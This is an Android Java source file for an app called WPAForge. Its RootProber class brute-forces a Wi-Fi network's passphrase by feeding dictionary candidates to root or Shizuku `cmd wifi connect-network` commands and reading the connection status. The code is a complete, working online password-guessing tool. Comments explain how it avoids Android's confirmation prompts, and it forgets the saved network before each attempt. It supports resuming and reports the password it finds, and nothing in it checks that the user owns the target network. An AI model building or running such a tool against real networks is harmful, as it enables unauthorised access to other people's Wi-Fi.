package io.github.wlmosv_png.wpaforge.audit;

import io.github.wlmosv_png.wpaforge.L;

import android.content.Context;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.util.ArrayList;
import java.util.List;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicBoolean;

import io.github.wlmosv_png.wpaforge.core.NetRecord;

/**
 * Root 模式连接器。通过 su 调用系统自带的 `cmd wifi` 命令驱动 WiFi 连接。
 *
 * 为什么需要 root：
 *   Android 10+ 的 WifiNetworkSpecifier 会强制弹出系统确认框，普通应用无法静默连接，
 *   所以那条路做不了字典遍历。而 `cmd wifi connect-network` 是 shell 权限的命令，
 *   root 可以调用，不弹窗、能拿真实结果。
 *
 * 实测行为（本机验证）：
 *   正确密码 → 约 12 秒后 `Wifi is connected to "<SSID>"`
 *   错误密码 → 约 3 秒后 `Wifi is not connected`
 *
 * 关键细节：连接前必须先 forgetNetwork，否则系统可能复用已保存的旧密码，
 * 造成"不管传什么密码都成功"的假阳性。
 *
 * 取消机制：所有子进程都记录在案，cancel() 会直接杀掉它们，
 * 不用等阻塞调用自然返回。
 */
public final class RootProber {

    public enum Verdict { SUCCESS, AUTH_FAIL, TIMEOUT, ERROR }

    public static final class Attempt {
        public final String candidate;
        public final Verdict verdict;
        public final long elapsedMs;
        public final String detail;
        public Attempt(String candidate, Verdict v, long ms, String detail) {
            this.candidate = candidate;
            this.verdict = v;
            this.elapsedMs = ms;
            this.detail = detail == null ? "" : detail;
        }
    }

    public interface Listener {
        void onAttemptStart(int index, int total, String candidate);
        void onAttemptResult(Attempt attempt);
        void onProgress(int tested, int total, double rate, long etaMs);
        /**
         * @param outcome NORMAL=跑完 / PAUSED=暂停（可续跑）/ STOPPED=用户停止
         * @param offset  当前进度，续跑时从这里开始
         */
        void onFinished(Outcome outcome, int tested, int offset, String hitPassword);
        void onHit(String ssid, String password);
        void onBlocked(String reason);
    }

    /** 结束原因 */
    public enum Outcome { NORMAL, PAUSED, STOPPED }

    private static final long POLL_MS = 400L;
    private static final long COOLDOWN_MS = 400L;
    private static final String TAG = "WPAForgeRoot";

    private final Context appCtx;
    /** 执行通道：true = 走 Shizuku（shell 身份），false = 走 su（root） */
    private final boolean useShizuku;

    /** 取消标志。volatile 保证工作线程能立刻看到。 */
    private final AtomicBoolean cancelFlag = new AtomicBoolean(false);
    /** 暂停标志。与取消的区别：暂停后进度保留，可续跑。 */
    private final AtomicBoolean pauseFlag = new AtomicBoolean(false);
    /** 当前正在跑的子进程，cancel 时直接 kill */
    private volatile Process activeProc;

    public RootProber(Context ctx) {
        this(ctx, false);
    }

    /**
     * @param shizuku true 表示通过 Shizuku 以 shell 身份执行（免 root），
     *                false 表示通过 su 以 root 身份执行。
     *                两种通道跑的是**同一条 cmd wifi 命令**，行为一致。
     */
    public RootProber(Context ctx, boolean shizuku) {
        this.appCtx = ctx.getApplicationContext();
        this.useShizuku = shizuku;
    }

    /** 当前通道名，给日志用 */
    public String channelName() {
        return useShizuku ? "Shizuku" : "Root";
    }

    /** 检测结果（带可操作的提示） */
    public static final class CheckResult {
        public final boolean ok;
        public final String title;    // 一句话结论
        public final String detail;   // 详细原因 / 怎么办

        public CheckResult(boolean ok, String title, String detail) {
            this.ok = ok;
            this.title = title;
            this.detail = detail;
        }
    }

    /**
     * 检查 root 与 cmd wifi 是否可用。
     *
     * 三重检测，逐级放宽，避免慢设备或输出截断造成的误判：
     *   1. su 是否可用（id 返回 uid=0）
     *   2. cmd wifi 是否存在
     *   3. connect-network 子命令是否存在
     *
     * 任何一步失败都给出「怎么办」，而不是一句"不支持"。
     */
    public static CheckResult check(Context ctx) {
        // 1) root
        String idOut = exec(null, new String[]{"su", "-c", "id"}, 12000);
        if (idOut == null) {
            return new CheckResult(false,
                    L.s("无法执行 su", "Cannot run su"),
                    L.s("没有检测到 root 权限。\n\n"
                            + "请确认：\n"
                            + "· 设备已 root（Magisk / KernelSU / APatch）\n"
                            + "· 在 root 管理器里给本应用授予了权限\n"
                            + "· 授权后重新打开本应用",
                        "Root was not detected.\n\n"
                            + "Check that:\n"
                            + "· the device is rooted (Magisk / KernelSU / APatch)\n"
                            + "· this app is granted root in your root manager\n"
                            + "· you reopen this app after granting"));
        }
        if (!idOut.contains("uid=0")) {
            return new CheckResult(false,
                    L.s("root 权限被拒绝", "Root denied"),
                    L.s("su 执行了但没有拿到 root。\n\n"
                            + "打开你的 root 管理器，在「超级用户」列表里\n"
                            + "找到 WPAForge 并允许。",
                        "su ran but did not return root.\n\n"
                            + "Open your root manager, find WPAForge under\n"
                            + "Superuser and allow it."));
        }

        // 2) cmd wifi 是否存在
        String wifiHelp = exec(null, new String[]{"su", "-c", "cmd wifi help"}, 20000);
        if (wifiHelp == null || wifiHelp.trim().isEmpty()) {
            return new CheckResult(false,
                    L.s("无法调用 cmd wifi", "Cannot invoke cmd wifi"),
                    L.s("系统没有响应 cmd wifi 命令。\n\n"
                            + "这通常说明：\n"
                            + "· 系统版本过低（Android 9 及以下没有这个命令）\n"
                            + "· 厂商裁剪了 wifi 服务\n\n"
                            + "本功能需要 Android 10 或更高版本。",
                        "The system did not respond to cmd wifi.\n\n"
                            + "Usually means:\n"
                            + "· Android 9 or lower (the command does not exist)\n"
                            + "· the vendor stripped the wifi service\n\n"
                            + "This feature needs Android 10 or higher."));
        }

        // 3) connect-network 子命令
        if (wifiHelp.contains("connect-network")) {
            return new CheckResult(true, "", "");
        }

        // 有些 ROM 的 help 输出被截断，再宽一点：直接问 add-network / forget-network
        String extra = exec(null, new String[]{"su", "-c", "cmd wifi list-networks"}, 20000);
        if (extra != null && (extra.contains("Network Id") || extra.contains("SSID"))) {
            // 能列出网络说明 wifi 服务是活着的，connect-network 大概率也在，
            // 只是 help 文本被截断。放行，真出错时执行阶段会报出来。
            return new CheckResult(true, "", "");
        }

        return new CheckResult(false,
                L.s("本机不支持连接命令", "Device lacks the connect command"),
                L.s("你的系统 cmd wifi 里没有 connect-network。\n\n"
                        + "常见于：\n"
                        + "· Android 10 以下的设备\n"
                        + "· 厂商深度定制的 ROM\n\n"
                        + "可以试试换一台 Android 11 以上的设备。",
                    "Your system's cmd wifi has no connect-network.\n\n"
                        + "Common on:\n"
                        + "· devices below Android 10\n"
                        + "· heavily customised ROMs\n\n"
                        + "Try an Android 11+ device."));
    }

    /** 检查 Shizuku 通道是否可用 */
    public static CheckResult checkShizuku(Context ctx) {
        // 顺序很重要：先看服务在不在（能连上 binder 就说明装了，
        // 也绕开了包可见性可能带来的误判），再看授权。
        boolean alive = ShizukuRunner.isAvailable();

        if (!alive && !ShizukuRunner.isInstalled(ctx)) {
            return new CheckResult(false,
                    L.s("没有检测到 Shizuku", "Shizuku not detected"),
                    L.s("Shizuku 让应用以 shell 身份运行，不需要 root。\n\n"
                            + "如果你已经装了 Shizuku，多半是服务没启动：\n"
                            + "1. 打开 Shizuku 应用\n"
                            + "2. 点「启动服务」（需要 ADB 或 root 激活一次）\n"
                            + "3. 回到本应用重试\n\n"
                            + "还没装的话，去 Shizuku 的 GitHub 下载。\n"
                            + "不想折腾就直接用 Root 模式。",
                        "Shizuku lets apps run as the shell user — no root needed.\n\n"
                            + "If you already installed it, the service is probably not running:\n"
                            + "1. Open the Shizuku app\n"
                            + "2. Tap Start (needs a one-time ADB or root activation)\n"
                            + "3. Come back and retry\n\n"
                            + "Or just use Root mode."));
        }

        if (!alive) {
            return new CheckResult(false,
                    L.s("Shizuku 服务未运行", "Shizuku service is not running"),
                    L.s("Shizuku 装了但服务没起来。\n\n"
                            + "打开 Shizuku 应用，点「启动」——\n"
                            + "注意：重启手机后需要重新激活。",
                        "Shizuku is installed but its service is not running.\n\n"
                            + "Open the Shizuku app and tap Start.\n"
                            + "Note: activation must be repeated after a reboot."));
        }

        if (!ShizukuRunner.isGranted()) {
            return new CheckResult(false,
                    L.s("尚未授权本应用", "Permission not granted"),
                    L.s("Shizuku 在运行了，但还没允许本应用使用它。\n\n"
                            + "打开 Shizuku → 已授权应用 → 找到 WPAForge → 打开开关。",
                        "Shizuku is running but this app is not authorised.\n\n"
                            + "Shizuku → Authorised apps → WPAForge → enable."));
        }

        // 真跑一条命令确认通道可用
        String out = ShizukuRunner.exec("cmd wifi help", 15000);
        if (out == null || out.trim().isEmpty()) {
            return new CheckResult(false,
                    L.s("Shizuku 通道无法执行命令",
                            "Shizuku channel cannot execute commands"),
                    L.s("授权了但命令执行失败。\n\n"
                            + "试试：重启 Shizuku 服务，或重启手机后重新激活。",
                        "Granted but command execution failed.\n\n"
                            + "Try restarting the Shizuku service."));
        }
        if (!out.contains("connect-network")
                && !out.contains("list-networks")) {
            return new CheckResult(false,
                    L.s("本机不支持连接命令", "Device lacks the connect command"),
                    L.s("能执行命令，但系统里没有 connect-network。\n\n"
                            + "通常出现在 Android 10 以下的设备。",
                        "Commands run, but connect-network is missing.\n"
                            + "Usually an Android 10 or older device."));
        }
        return new CheckResult(true, "", "");
    }

    /** 兼容旧调用：只返回错误文案（空串表示可用） */
    public static String checkRoot() {
        CheckResult r = check(null);
        if (r.ok) return "";
        return r.title + (r.detail.isEmpty() ? "" : "\n" + r.detail);
    }

    public boolean isRunning() {
        return !cancelFlag.get() && activeProc != null;
    }

    /**
     * 取消。立刻杀掉正在跑的子进程，主循环下一轮就会退出。
     * 不用等阻塞调用自然超时。
     */
    /** 暂停：保留进度，可续跑。不杀子进程（让它自然结束当前这一条）。 */
    public void pause() {
        pauseFlag.set(true);
    }

    public boolean isPaused() {
        return pauseFlag.get();
    }

    public void cancel() {
        cancelFlag.set(true);
        pauseFlag.set(false);
        Process p = activeProc;
        if (p != null) {
            try {
                // destroyForcibly 会 SIGKILL，避免 su 进程挂住
                p.destroyForcibly();
                android.util.Log.i(TAG, L.s("已强制结束当前子进程", "Killed the current subprocess"));
            } catch (Exception ignored) {}
        }
    }

    /** 从第 0 条开始跑 */
    public void run(NetRecord target, List<Candidate> candidates, Listener l) {
        run(target, candidates, 0, l);
    }

    /**
     * 从指定位置开始跑（断点续跑）。
     *
     * @param startOffset 从第几条开始（0 起）
     */
    public void run(NetRecord target, List<Candidate> candidates, int startOffset, Listener l) {
        String rootIssue = checkRoot();
        if (!rootIssue.isEmpty()) {
            l.onBlocked(rootIssue);
            return;
        }
        if (target == null || target.ssid.isEmpty()) {
            l.onBlocked(L.s("目标网络信息不完整", "Incomplete target network info"));
            return;
        }
        if (candidates == null || candidates.isEmpty()) {
            l.onBlocked(L.s("候选字典为空", "Candidate dictionary is empty"));
            return;
        }

        cancelFlag.set(false);
        pauseFlag.set(false);
        int total = candidates.size();
        int startIdx = Math.max(0, Math.min(startOffset, total));
        int tested = 0;                       // 本轮试了多少条
        int cursor = startIdx;                // 绝对位置
        long start = System.currentTimeMillis();
        String sec = securityArg(target);

        try {
            forgetTarget(target);

            for (int i = startIdx; i < total; i++) {
                if (cancelFlag.get() || pauseFlag.get()) break;
                Candidate c = candidates.get(i);
                tested++;
                cursor = i + 1;               // 处理完这条，进度推进到这里
                l.onAttemptStart(cursor, total, c.password);

                long t0 = System.currentTimeMillis();
                Attempt a = tryOne(target, sec, c.password);
                long dt = System.currentTimeMillis() - t0;

                l.onAttemptResult(new Attempt(c.password, a.verdict, dt, a.detail));

                if (a.verdict == Verdict.SUCCESS) {
                    l.onHit(target.displayName(), c.password);
                    l.onFinished(Outcome.NORMAL, tested, cursor, c.password);
                    return;
                }

                double rate = tested / Math.max(0.001, (System.currentTimeMillis() - start) / 1000.0);
                long eta = rate > 0 ? (long) ((total - cursor) / rate * 1000) : -1;
                l.onProgress(cursor, total, rate, eta);

                if (cancelFlag.get() || pauseFlag.get()) break;

                forgetTarget(target);
                interruptibleSleep(COOLDOWN_MS);
            }
        } finally {
            activeProc = null;
            Outcome oc = cancelFlag.get() ? Outcome.STOPPED
                    : pauseFlag.get() ? Outcome.PAUSED
                    : Outcome.NORMAL;
            l.onFinished(oc, tested, cursor, null);
        }
    }

    private Attempt tryOne(NetRecord target, String sec, String password) {
        long t0 = System.currentTimeMillis();

        // 命令异步发出，立刻返回。轮询期间持续检查取消标志。
        // su -c 里加了 timeout，防止 connect-network 自己挂太久。
        String cmd = "cmd wifi connect-network "
                + shellQuote(target.ssid) + " " + sec + " " + shellQuote(password);
        if (useShizuku) {
            final String scmd = cmd;
            new Thread(() -> ShizukuRunner.exec(scmd, 20000), "wpaforge-shizuku-conn").start();
        } else {
            execAsync(new String[]{"su", "-c", "timeout 20 " + cmd});
        }

        // 正确密码约 12 秒能连上；错误密码约 3 秒进入未连接。
        // 最长等 16 秒，超过就当超时（避免阻塞太久）。
        long deadline = System.currentTimeMillis() + 16_000L;
        while (System.currentTimeMillis() < deadline) {
            if (cancelFlag.get() || pauseFlag.get()) {
                return new Attempt(password, Verdict.TIMEOUT,
                        System.currentTimeMillis() - t0, L.s("已中断", "Interrupted"));
            }
            interruptibleSleep(POLL_MS);
            if (cancelFlag.get() || pauseFlag.get()) {
                return new Attempt(password, Verdict.TIMEOUT,
                        System.currentTimeMillis() - t0, L.s("已中断", "Interrupted"));
            }
            String st = status();
            if (st == null) continue;

            if (isConnectedTo(st, target.ssid)) {
                return new Attempt(password, Verdict.SUCCESS,
                        System.currentTimeMillis() - t0, L.s("已连上", "Connected"));
            }
            if (st.contains("not connected")) {
                return new Attempt(password, Verdict.AUTH_FAIL,
                        System.currentTimeMillis() - t0, L.s("密码错误", "Wrong passphrase"));
            }
        }
        return new Attempt(password, Verdict.TIMEOUT,
                System.currentTimeMillis() - t0, L.s("超时", "Timeout"));
    }

    private String status() {
        if (useShizuku) {
            return ShizukuRunner.exec("cmd wifi status", 3000);
        }
        return execTracked(new String[]{"su", "-c", "cmd wifi status"}, 3000);
    }

    /** 与 exec 相同，但会把进程登记到 activeProc，使 cancel() 能中断它 */
    private String execTracked(String[] cmd, long timeoutMs) {
        Process p = null;
        try {
            ProcessBuilder pb = new ProcessBuilder(cmd);
            pb.redirectErrorStream(true);
            p = pb.start();
            activeProc = p;                    // ← 关键：让 cancel 能杀到
            final Process fp = p;

            StringBuilder sb = new StringBuilder();
            try (BufferedReader r = new BufferedReader(new InputStreamReader(p.getInputStream()))) {
                String line;
                long deadline = System.currentTimeMillis() + timeoutMs;
                while ((line = r.readLine()) != null) {
                    sb.append(line).append('\n');
                    if (System.currentTimeMillis() > deadline) break;
                    if (cancelFlag.get()) break;
                }
            }
            p.waitFor(300, TimeUnit.MILLISECONDS);
            return sb.toString();
        } catch (Exception e) {
            return null;
        } finally {
            if (activeProc == p) activeProc = null;
            if (p != null) {
                try { p.destroy(); } catch (Exception ignored) {}
            }
        }
    }

    /**
     * 把 {"su","-c",X} / {"su","-c",X,Y} 剥成纯命令字符串 X。
     * 不是该形态就原样拼接（保底不改变行为）。
     */
    private static String unwrapSu(String[] cmd) {
        if (cmd == null || cmd.length == 0) return "";
        if (cmd.length >= 3 && "su".equals(cmd[0]) && "-c".equals(cmd[1])) {
            StringBuilder sb = new StringBuilder(cmd[2]);
            for (int i = 3; i < cmd.length; i++) sb.append(' ').append(cmd[i]);
            return sb.toString();
        }
        return String.join(" ", cmd);
    }

    private static boolean isConnectedTo(String status, String ssid) {
        if (status == null) return false;
        return status.contains("connected to \"" + ssid + "\"");
    }

    /** 删除目标网络的已保存配置，用 netId 精确定位 */
    private void forgetTarget(NetRecord target) {
        if (cancelFlag.get()) return;
        try {
            String list = useShizuku
                    ? ShizukuRunner.exec("cmd wifi list-networks", 4000)
                    : execTracked(new String[]{"su", "-c", "cmd wifi list-networks"}, 4000);
            if (list == null) return;
            for (String line : list.split("\n")) {
                String t = line.trim();
                if (!t.matches("^\\d+\\s+.*")) continue;
                String[] parts = t.split("\\s+");
                if (parts.length < 3) continue;
                String netId = parts[0];
                String ssid = parts[1];
                if (!ssid.equals(target.ssid)) continue;
                if (useShizuku) {
                    ShizukuRunner.exec("cmd wifi forget-network " + netId, 4000);
                } else {
                    execTracked(new String[]{"su", "-c",
                            "cmd wifi forget-network " + netId}, 4000);
                }
                android.util.Log.i(TAG, "forget " + ssid + " netId=" + netId);
            }
        } catch (Exception e) {
            android.util.Log.w(TAG, L.s("forgetTarget 失败: ", "forgetTarget failed: ") + e);
        }
    }

    private static String securityArg(NetRecord t) {
        switch (t.security) {
            case OPEN: return "open";
            case OWE: return "owe";
            case WEP: return "wep";
            case WPA3: return "wpa3";
            default: return "wpa2";
        }
    }

    private static String shellQuote(String s) {
        if (s == null) return "''";
        return "'" + s.replace("'", "'\\''") + "'";
    }

    /** 可被打断的等待：每 100ms 检查一次取消标志 */
    private void interruptibleSleep(long ms) {
        long end = System.currentTimeMillis() + ms;
        while (System.currentTimeMillis() < end) {
            if (cancelFlag.get() || pauseFlag.get()) return;
            try {
                Thread.sleep(Math.min(100, Math.max(1, end - System.currentTimeMillis())));
            } catch (InterruptedException e) {
                return;
            }
        }
    }

    /** 按当前通道执行命令（实例方法） */
    private String runShell(String shellCmd, long timeoutMs) {
        if (useShizuku) {
            return ShizukuRunner.exec(shellCmd, timeoutMs);
        }
        return exec(this, new String[]{"su", "-c", shellCmd}, timeoutMs);
    }

    /**
     * 异步跑一个进程，不读输出。用于发命令。
     *
     * 注意两种通道的**命令形态不同**：
     *   Root    —— 传 {"su","-c",X}，由 ProcessBuilder 直接起 su
     *   Shizuku —— 传 {"su","-c",X} 是**错的**：Shizuku 已经是 shell 身份，
     *              没有 su，命令会直接失败。必须把 X 单独交给 ShizukuRunner。
     *   这里以前用 `String.join(" ", cmd)` 拼成 "su -c X" 再丢给 Shizuku，
     *   结果是 Shizuku 模式永远发不出连接命令 —— 这正是「三种模式只有 root 能用」
     *   的根因之一。
     */
    private void execAsync(String[] cmd) {
        if (useShizuku) {
            // 剥掉 su -c 包装，只把真正的命令交给 shell 身份执行
            final String shellCmd = unwrapSu(cmd);
            new Thread(() -> {
                try {
                    ShizukuRunner.exec(shellCmd, 20000);
                } catch (Exception ignored) {}
            }, "wpaforge-shizuku-async").start();
            return;
        }
        try {
            ProcessBuilder pb = new ProcessBuilder(cmd);
            pb.redirectErrorStream(true);
            Process p = pb.start();
            activeProc = p;
            // 输出丢弃，但必须在另一个线程消费，否则缓冲区满了会阻塞
            new Thread(() -> {
                try (BufferedReader r = new BufferedReader(
                        new InputStreamReader(p.getInputStream()))) {
                    while (r.readLine() != null) { /* 丢弃 */ }
                } catch (Exception ignored) {}
            }, "wpaforge-drain").start();
        } catch (Exception e) {
            android.util.Log.w(TAG, L.s("execAsync 失败: ", "execAsync failed: ") + e);
        }
    }

    /** 同步执行并拿 stdout，超时可中断 */
    public static String exec(Object ctx, String[] cmd, long timeoutMs) {
        Process p = null;
        try {
            ProcessBuilder pb = new ProcessBuilder(cmd);
            pb.redirectErrorStream(true);
            p = pb.start();
            final Process fp = p;
            // 超时后强杀，避免挂住
            Thread killer = new Thread(() -> {
                try {
                    if (!fp.waitFor(timeoutMs, TimeUnit.MILLISECONDS)) {
                        fp.destroyForcibly();
                    }
                } catch (Exception ignored) {}
            });
            killer.setDaemon(true);
            killer.start();

            StringBuilder sb = new StringBuilder();
            try (BufferedReader r = new BufferedReader(new InputStreamReader(p.getInputStream()))) {
                String line;
                while ((line = r.readLine()) != null) sb.append(line).append('\n');
            }
            p.waitFor(500, TimeUnit.MILLISECONDS);
            return sb.toString();
        } catch (Exception e) {
            return null;
        } finally {
            if (p != null) {
                try { p.destroy(); } catch (Exception ignored) {}
            }
        }
    }
}
